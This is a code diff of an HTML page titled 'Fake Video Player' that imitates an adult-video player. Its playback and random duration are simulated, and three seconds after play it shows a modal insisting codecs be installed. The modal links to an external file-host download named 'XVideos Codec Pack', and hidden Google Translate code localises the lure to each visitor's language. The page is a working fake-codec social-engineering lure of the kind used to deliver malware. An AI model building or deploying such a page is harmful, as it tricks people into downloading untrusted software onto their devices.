@@ -1,42 +1,63 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Full Video Access</title>
+  <title>Fake Video Player - Multilingual</title>
   <style>
-    html, body {
+    /* Скрываем виджеты Google Translate */
+    .goog-te-banner-frame.skiptranslate,
+    .goog-te-gadget-icon,
+    #goog-gt-tt,
+    .goog-te-balloon-frame,
+    .goog-te-menu-frame { display: none !important; }
+    body > .skiptranslate { display: none !important; }
+
+    body {
       margin: 0;
-      padding: 0;
-      height: 100%;
-      background-color: #000;
+      background: #000;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-family: "Segoe UI Variable", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      overflow: hidden;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      color: #fff;
     }
 
     .player {
       position: relative;
-      width: 90vw;  /* Плеер будет занимать 90% ширины экрана */
-      height: 50vw; /* Высота будет зависеть от ширины */
-      max-width: 800px; /* Ограничиваем максимальную ширину */
-      max-height: 450px; /* Ограничиваем максимальную высоту */
-      background-color: #222;
-      border-radius: 12px;
+      width: 90vw;
+      max-width: 900px;
+      aspect-ratio: 16/9;
+      background: #000 url("ai_bot.png") center/cover no-repeat;
       overflow: hidden;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-    }
-
-    .player img {
-      width: 100%;
-      height: 100%;  /* Заполнение всей высоты и ширины контейнера */
-      object-fit: cover;  /* Изображение будет обрезаться, чтобы заполнить контейнер */
+      border-radius: 10px;
       cursor: pointer;
     }
 
-    /* Модальное окно */
+    .controls {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: rgba(0,0,0,0.7);
+      display: flex;
+      align-items: center;
+      padding: 8px;
+      gap: 10px;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    .btn { cursor: pointer; display: flex; align-items: center; user-select: none; font-size: 16px; }
+    .progress-container { flex: 1; display: flex; align-items: center; gap: 8px; min-width: 80px; }
+    .progress-bar { flex: 1; height: 4px; background: #333; border-radius: 2px; position: relative; cursor: pointer; }
+    .progress { width: 0%; height: 100%; background: #e65c2d; }
+    .time { white-space: nowrap; font-size: 13px; }
+    .right-controls { display: flex; gap: 12px; align-items: center; }
+    .volume { display: flex; align-items: center; gap: 4px; min-width: 60px; }
+    .volume input[type="range"] { width: 80px; cursor: pointer; }
+
     .modal {
       display: none;
       position: fixed;
@@ -49,196 +70,183 @@
       align-items: center;
       justify-content: center;
       padding: 10px;
+      opacity: 0;
+      transition: opacity 0.3s ease;
     }
-
+    .modal.show { display: flex; opacity: 1; }
     .modal-content {
-      background-color: #f3f3f3;
-      border-radius: 12px;
-      width: 100%;
-      max-width: 400px;
+      background: rgba(243, 243, 243, 0.9);
+      border-radius: 10px;
+      max-width: 320px;
       text-align: center;
-      padding: 25px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+      padding: 18px 20px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.3);
       color: #000;
-      font-size: 15px;
-    }
-
-    .modal-content .icon {
-      font-size: 60px;
-      color: #d93025;
-      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-      margin-bottom: 15px;
-    }
-
-    .modal-content p {
-      margin: 0 0 20px 0;
-      font-weight: 500;
-    }
-
-    .modal-buttons a {
-      padding: 12px 28px;
-      font-size: 15px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      text-decoration: none;
-      color: #fff;
-      background-color: #0078d4;
-      display: inline-block;
-    }
-
-    .modal-buttons a:hover {
-      background-color: #005a9e;
-    }
-
-    /* Элементы управления */
-    .controls {
-      position: absolute;
-      bottom: 10px;
-      left: 10px;
-      right: 10px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      color: white;
-      padding: 0 10px;
-      width: calc(100% - 20px); /* Подгонка по размеру */
-    }
-
-    .progress-bar {
-      width: 100%;
-      height: 8px;
-      background-color: #444;
-      border-radius: 4px;
-      cursor: pointer;
-      position: relative;
-    }
-
-    .progress {
-      width: 0%;
-      height: 100%;
-      background-color: #0078d4;
-      border-radius: 4px;
-    }
-
-    .time {
       font-size: 14px;
-      font-weight: bold;
+      transform: scale(0.9);
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      opacity: 0;
     }
+    .modal.show .modal-content { transform: scale(1); opacity: 1; }
+    .modal-content .icon { font-size: 48px; color: #d93025; margin-bottom: 10px; }
+    .modal-content p { margin: 0 0 15px 0; font-weight: 500; line-height: 1.4; }
+    .modal-buttons a { padding: 10px 22px; font-size: 14px; border-radius: 6px; text-decoration: none; color: #fff; background-color: #0078d4; display: inline-block; }
+    .modal-buttons a:hover { background-color: #005a9e; }
 
-    /* Медиазапросы для мобильных устройств */
-    @media (max-width: 600px) {
-      .player {
-        width: 95vw;  /* Уменьшаем размер плеера для мобильных устройств */
-        height: 55vw; /* Высота пропорционально ширине */
-      }
-
-      .modal-content {
-        width: 80%;  /* Меньшая ширина модального окна */
-      }
-
-      .time {
-        font-size: 12px; /* Уменьшаем шрифт времени на мобильных */
-      }
+    @media (max-width: 768px) {
+      .controls { font-size: 12px; gap: 6px; padding: 6px; }
+      .btn { font-size: 14px; }
+      .time { font-size: 11px; }
+      .volume input[type="range"] { width: 60px; }
     }
-
-    @media (max-width: 400px) {
-      .time {
-        font-size: 10px; /* Уменьшаем шрифт времени на очень маленьких экранах */
-      }
+    @media (max-width: 480px) {
+      .controls { font-size: 11px; gap: 4px; }
+      .btn { font-size: 12px; }
+      .time { font-size: 10px; }
+      .volume input[type="range"] { width: 50px; }
     }
   </style>
 </head>
 <body>
+  <!-- Google Translate Element -->
+  <div id="google_translate_element" style="display: none;"></div>
 
-  <!-- Плеер с изображением -->
   <div class="player" id="player">
-    <img src="ai_bot.png" alt="AI Bot" id="trigger">
-
-    <!-- Элементы управления -->
     <div class="controls">
-      <div class="progress-bar" id="progress-bar">
-        <div class="progress" id="progress"></div>
+      <div class="btn" id="play-btn">▶</div>
+      <div class="volume">
+        <div class="btn">🔊</div>
+        <input type="range" id="volume" min="0" max="100" value="50">
       </div>
-      <div class="time" id="time">00:00 / 00:00</div>
+      <div class="progress-container">
+        <div class="progress-bar" id="progress-bar"><div class="progress" id="progress"></div></div>
+        <div class="time" id="time">0:00 / 0:00</div>
+      </div>
+      <div class="right-controls">
+        <div class="btn">⚙</div>
+        <div class="btn" id="fullscreen-btn">⛶</div>
+      </div>
     </div>
   </div>
 
-  <!-- Модальное окно -->
   <div class="modal" id="modal">
     <div class="modal-content">
       <div class="icon">⚠</div>
-      <p id="modal-text">Для просмотра видео необходимо установить кодеки.</p>
+      <p>To play the video correctly, you need to install codecs.</p>
       <div class="modal-buttons">
-        <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank" rel="noopener noreferrer">Установить</a>
+        <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank" rel="noopener noreferrer">Install</a>
       </div>
     </div>
   </div>
 
-  <script>
-    const trigger = document.getElementById('trigger');
-    const progressBar = document.getElementById('progress-bar');
-    const progress = document.getElementById('progress');
-    const timeDisplay = document.getElementById('time');
-    const modal = document.getElementById('modal');
+<script>
+const playBtn = document.getElementById("play-btn");
+const volumeSlider = document.getElementById("volume");
+const fullscreenBtn = document.getElementById("fullscreen-btn");
+const player = document.getElementById("player");
+const modal = document.getElementById("modal");
+const modalLink = document.querySelector(".modal-buttons a");
+const progress = document.getElementById("progress");
+const progressBar = document.getElementById("progress-bar");
+const timeDisplay = document.getElementById("time");
 
-    // Генерация случайного времени от 12:02 (722 секунды) до 25:48 (928 секунд)
-    function getRandomTime() {
-      const min = 722; // 12:02 в секундах
-      const max = 928; // 25:48 в секундах
-      return Math.floor(Math.random() * (max - min + 1)) + min;
-    }
+let isPlaying = false;
+let interval;
+let currentTime = 0;
+const totalDuration = Math.floor(Math.random() * (928 - 722 + 1)) + 722;
+let modalTimeout;
 
-    const totalDuration = getRandomTime(); // Генерируем случайное время
-    let currentTime = 0;
-    let interval;
+function formatTime(sec) {
+  const m = Math.floor(sec / 60);
+  const s = sec % 60;
+  return `${m}:${s.toString().padStart(2,"0")}`;
+}
 
-    // Функция форматирования времени в строку MM:SS
-    function formatTime(seconds) {
-      const minutes = Math.floor(seconds / 60);
-      const remainingSeconds = seconds % 60;
-      return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
-    }
+function updateTime() {
+  timeDisplay.textContent = `${formatTime(currentTime)} / ${formatTime(totalDuration)}`;
+  progress.style.width = `${(currentTime / totalDuration) * 100}%`;
+}
 
-    // Обновление времени и прогресса
-    function updateTime() {
-      timeDisplay.textContent = `${formatTime(currentTime)} / ${formatTime(totalDuration)}`;
-      const progressWidth = (currentTime / totalDuration) * 100;
-      progress.style.width = `${progressWidth}%`;
-    }
+function startProgress() {
+  if (!interval) {
+    interval = setInterval(() => {
+      if (currentTime < totalDuration) {
+        currentTime++;
+        updateTime();
+      } else {
+        clearInterval(interval);
+        interval = null;
+      }
+    }, 1000);
+  }
+}
 
-    // Функция воспроизведения
-    function startProgress() {
-      interval = setInterval(() => {
-        if (currentTime < totalDuration) {
-          currentTime++;
-          updateTime();
-        } else {
-          stopProgress();
-        }
-      }, 1000);
-    }
+function showModalDelayed() {
+  clearTimeout(modalTimeout);
+  modalTimeout = setTimeout(() => {
+    modal.classList.add("show");
+  }, 3000);
+}
 
-    // Остановка воспроизведения
-    function stopProgress() {
+playBtn.addEventListener("click", () => {
+  if (!isPlaying) {
+    startProgress();
+    showModalDelayed();
+  }
+  isPlaying = !isPlaying;
+  playBtn.textContent = isPlaying ? "⏸" : "▶";
+});
+
+modalLink.addEventListener("click", () => {
+  modal.classList.remove("show");
+});
+
+player.addEventListener("click", (e) => {
+  if (e.target === player && !isPlaying) {
+    startProgress();
+    showModalDelayed();
+    isPlaying = true;
+    playBtn.textContent = "⏸";
+  }
+});
+
+volumeSlider.addEventListener("input", () => {
+  console.log("Volume:", volumeSlider.value);
+});
+
+fullscreenBtn.addEventListener("click", () => {
+  if (!document.fullscreenElement) {
+    player.requestFullscreen().catch(err => alert(`Error: ${err.message}`));
+  } else {
+    document.exitFullscreen();
+  }
+});
+
+progressBar.addEventListener("click", (e) => {
+  const rect = progressBar.getBoundingClientRect();
+  const clickX = e.clientX - rect.left;
+  const newTime = Math.floor((clickX / rect.width) * totalDuration);
+  currentTime = newTime;
+  updateTime();
+});
+
+updateTime();
+
+// Google Translate Init
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en', autoDisplay: false}, 'google_translate_element');
+  const userLang = navigator.language || navigator.userLanguage;
+  const langCode = userLang.split('-')[0];
+  const interval = setInterval(() => {
+    const select = document.querySelector('.goog-te-combo');
+    if (select) {
+      select.value = langCode;
+      select.dispatchEvent(new Event('change'));
       clearInterval(interval);
     }
-
-    // Показ модального окна
-    trigger.addEventListener('click', () => {
-      modal.style.display = 'flex';
-      startProgress(); // Начинаем воспроизведение по клику на изображение
-    });
-
-    // Закрытие модального окна при клике на кнопку
-    const modalLink = document.querySelector('.modal-buttons a');
-    modalLink.addEventListener('click', () => {
-      modal.style.display = 'none';
-    });
-
-    // Отображаем случайное время при загрузке
-    updateTime(); // Начальное время = 0
-  </script>
-
+  }, 500);
+}
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
